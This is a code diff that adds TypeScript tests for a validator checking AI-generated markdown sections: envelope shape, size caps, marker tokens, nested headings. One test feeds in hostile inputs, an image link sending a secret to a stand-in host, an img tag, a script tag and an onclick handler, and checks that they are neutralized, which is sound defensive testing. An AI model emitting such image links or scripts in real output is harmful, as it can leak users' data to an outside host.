@@ -8,8 +8,10 @@ import {
   MAX_HEADING_CHARACTERS,
   MAX_MARKDOWN_CHARACTERS,
   MAX_SECTIONS,
+  MAX_TOTAL_SECTION_CHARACTERS,
   parseSectionOutput,
   queryForSections,
+  validateSectionOutput,
   type AgentClient,
   type AgentQueryRequest,
   type AgentQueryResponse,
@@ -165,6 +167,88 @@ describe("structured output schema", () => {
     expect(sections).not.toHaveProperty("$schema");
   });
 });
+
+describe("structured section validation", () => {
+  test("accepts a well-formed envelope", () => {
+    expect(validateSectionOutput(envelope(valid))).toEqual({ ok: true, sections: valid });
+  });
+
+  test("names the SDK's own retry exhaustion apart from a zod rejection", () => {
+    const exhausted = validateSectionOutput(undefined);
+    const rejected = validateSectionOutput(envelope([]));
+    expect(exhausted).toMatchObject({ ok: false, error: expect.stringContaining("no structured output") });
+    expect(rejected.ok).toBe(false);
+    if (!exhausted.ok && !rejected.ok) expect(exhausted.error).not.toBe(rejected.error);
+  });
+
+  test("rejects a bare array, because the envelope is the contract", () => {
+    expect(validateSectionOutput(valid)).toMatchObject({
+      ok: false,
+      error: expect.stringContaining("sections"),
+    });
+  });
+
+  test("keeps raw newlines and markdown code fences inside a markdown field", () => {
+    expect(validateSectionOutput(envelope([{ heading: "API", markdown: "```ts\nfoo()\n```\ndone" }]))).toEqual({
+      ok: true,
+      sections: [{ heading: "API", markdown: "```ts\nfoo()\n```\ndone" }],
+    });
+  });
+
+  test("trims edge newlines before writer validation", () => {
+    expect(validateSectionOutput(envelope([{ heading: "Summary", markdown: "\n- item\n" }]))).toEqual({
+      ok: true,
+      sections: [{ heading: "Summary", markdown: "- item" }],
+    });
+  });
+
+  test("neutralizes external images and dangerous raw HTML", () => {
+    const markdown = '![](https://evil.example/?d=secret)\n<img src="https://evil.example/x">\n<script>alert(1)</script>\n<div onclick="steal()">x</div>';
+    const result = validateSectionOutput(envelope([{ heading: "Summary", markdown }]));
+    expect(result.ok).toBe(true);
+    if (result.ok) {
+      expect(result.sections[0]!.markdown).toContain("`![](https://evil.example/?d=secret)`");
+      expect(result.sections[0]!.markdown).not.toContain("<img");
+      expect(result.sections[0]!.markdown).not.toContain("<script");
+      expect(result.sections[0]!.markdown).not.toContain("<div onclick=");
+      expect(result.sections[0]!.markdown).toContain("&lt;img");
+    }
+  });
+
+  test("rejects empty arrays and unusable headings", () => {
+    expect(validateSectionOutput(envelope([])).ok).toBe(false);
+    expect(validateSectionOutput(envelope([{ heading: " ", markdown: 3 }])).ok).toBe(false);
+    expect(validateSectionOutput(envelope([{ heading: "One\nTwo", markdown: "x" }])).ok).toBe(false);
+  });
+
+  test("rejects marker tokens in model output", () => {
+    expect(validateSectionOutput(envelope([{ heading: "Summary", markdown: AI_BLOCK_END }]))).toMatchObject({
+      ok: false,
+      error: expect.stringContaining("ownership marker"),
+    });
+  });
+
+  test("rejects a section array over the whole-array character cap", () => {
+    const markdown = "x".repeat(MAX_TOTAL_SECTION_CHARACTERS);
+    expect(validateSectionOutput(envelope([{ heading: "Summary", markdown }]))).toMatchObject({
+      ok: false,
+      error: expect.stringContaining(String(MAX_TOTAL_SECTION_CHARACTERS)),
+    });
+  });
+
+  // The one rejection zod alone cannot make: a level-two heading in a markdown field is a
+  // valid string, and only the writer knows it would split the AI-owned block in two.
+  test("rejects a level-two heading in a markdown field, which zod accepts and the writer does not", () => {
+    expect(validateSectionOutput(envelope([{ heading: "Summary", markdown: "## Nested\ntext" }]))).toEqual({
+      ok: false,
+      error: "Section markdown contains a level-two heading that would split the block.",
+    });
+  });
+});
+
+function envelope(sections: unknown): unknown {
+  return { sections };
+}
 
 describe("enhancement system prompt", () => {
   test("carries no machine format contract any more", () => {
